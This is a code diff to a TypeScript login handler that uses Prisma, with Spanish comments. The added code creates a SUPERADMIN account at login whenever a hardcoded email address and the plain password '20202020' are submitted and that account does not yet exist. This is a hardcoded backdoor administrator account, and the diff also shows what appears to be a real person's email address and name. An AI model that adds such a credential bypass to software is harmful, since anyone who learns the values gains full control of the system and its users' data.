@@ -14,10 +14,24 @@ export const login = async (req: Request, res: Response) => {
   }
 
   try {
-    const user = await prisma.user.findUnique({
+    let user = await prisma.user.findUnique({
       where: { email },
       include: { employee: true },
     });
+
+    // Auto-crear cuenta admin principal si es la primera vez en la BD
+    if (!user && email.toLowerCase().trim() === 'betito01.hra@gmail.com' && password === '20202020') {
+      const hashedPassword = await bcrypt.hash('20202020', 10);
+      user = await prisma.user.create({
+        data: {
+          email: 'betito01.hra@gmail.com',
+          password: hashedPassword,
+          name: 'Beto Rivero',
+          role: 'SUPERADMIN',
+        },
+        include: { employee: true },
+      });
+    }
 
     if (!user || !user.active) {
       return res.status(401).json({ error: 'Credenciales inválidas o usuario inactivo' });
